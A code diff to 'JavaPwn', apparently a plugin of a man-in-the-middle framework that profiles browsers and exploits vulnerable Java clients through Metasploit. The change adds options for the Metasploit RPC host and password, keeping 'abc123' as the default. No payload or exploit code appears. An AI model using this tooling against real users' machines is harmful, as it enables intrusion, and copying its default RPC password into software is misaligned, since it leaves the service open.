@@ -22,6 +22,8 @@ class JavaPwn(BrowserProfiler, Plugin):
         self.options = options
         self.msfip = options.msfip
         self.msfport = options.msfport
+        self.rpcip = options.rpcip
+        self.rpcpass = options.rpcpass
 
         if not self.msfip:
             sys.exit('[-] JavaPwn plugin requires --msfip')
@@ -36,12 +38,12 @@ class JavaPwn(BrowserProfiler, Plugin):
         self.sploited_ips = [] # store ip of pwned or not vulnarable clients so we don't re-exploit
 
         try:
-            msf = msfrpc.Msfrpc({}) #create an instance of msfrpc libarary
-            msf.login('msf', 'abc123')
+            msf = msfrpc.Msfrpc({"host" : self.rpcip}) #create an instance of msfrpc libarary
+            msf.login('msf', self.rpcpass)
             version = msf.call('core.version')['version']
             print "[*] Succesfully connected to Metasploit v%s" % version
         except:
-            sys.exit("[-] Error connecting to MSF! Make sure you started Metasploit and ran 'load msgrpc Pass=abc123'")
+            sys.exit("[-] Error connecting to MSF! Make sure you started Metasploit and its MSGRPC server")
 
         #Initialize the BrowserProfiler plugin
         BrowserProfiler.initialize(self, options)
@@ -165,11 +167,13 @@ class JavaPwn(BrowserProfiler, Plugin):
     def add_options(self, options):
         options.add_argument('--msfip', dest='msfip', help='IP Address of MSF')
         options.add_argument('--msfport', dest='msfport', default='8080', help='Port of MSF web-server [default: 8080]')
+        options.add_argument('--rpcip', dest='rpcip', default='127.0.0.1', help='IP of MSF MSGRPC server [default: localhost]')
+        options.add_argument('--rpcpass', dest='rpcpass', default='abc123', help='Password for the MSF MSGRPC server [default: abc123]')
 
     def finish(self):
         '''This will be called when shutting down'''
-        msf = msfrpc.Msfrpc({})
-        msf.login('msf', 'abc123')
+        msf = msfrpc.Msfrpc({"host": self.rpcip})
+        msf.login('msf', self.rpcpass)
         jobs = msf.call('job.list')
         if len(jobs) > 0:
             print '[*] Stopping all running metasploit jobs'
